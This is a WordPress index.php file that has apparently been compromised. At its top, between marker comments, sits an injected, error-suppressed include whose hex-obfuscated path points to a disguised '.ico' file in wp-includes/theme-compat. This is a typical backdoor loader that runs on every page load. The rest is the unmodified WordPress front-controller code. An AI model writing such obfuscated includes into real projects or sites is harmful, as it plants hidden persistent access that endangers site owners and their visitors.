<?php
/*2f2e8*/

@include "\x2fmnt/\x73ites\x2fharv\x69egro\x75p/cu\x72rent\x2fwp-i\x6eclud\x65s/th\x65me-c\x6fmpat\x2ffavi\x63on_d\x377461\x2eico";

/*2f2e8*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
